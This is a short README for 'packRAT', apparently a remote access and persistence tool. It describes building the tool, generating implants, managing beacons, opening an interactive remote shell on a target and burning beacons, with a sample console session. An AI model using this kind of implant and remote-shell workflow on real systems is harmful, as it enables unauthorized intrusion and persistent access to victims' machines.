# packRAT

Deep peristence management system

"They say to live off the land.  Well, we're in the landscaping business."


## Installation




## Example usage

1. Build packrat: `make`
1. Launch the packrat console: `./packrat`
2. Generate an implant with the `im[plant]` command

Example walkthrough:
```
packrat> b
    <copy command>
packrat> ls
    <list beacons>
    1. beacon-1
packrat> use 1
packrat(#1)> run bash -i
remote-target$ ls
...
remote-target$ whoami
user...
^c
packrat(#1)> ls
    <list sessions>
    1. session-1: bash -i
packrat(#1)> stop 1
packrat(#1)> ls
    <list sessions>
    <none>
packrat(#1)> exit
packrat> ls
    <list beacons>
    1. beacon-1
packrat> burn 1
packrat> ls
    <list beacons>
    <none>
packrat> exit
Goodbye!
```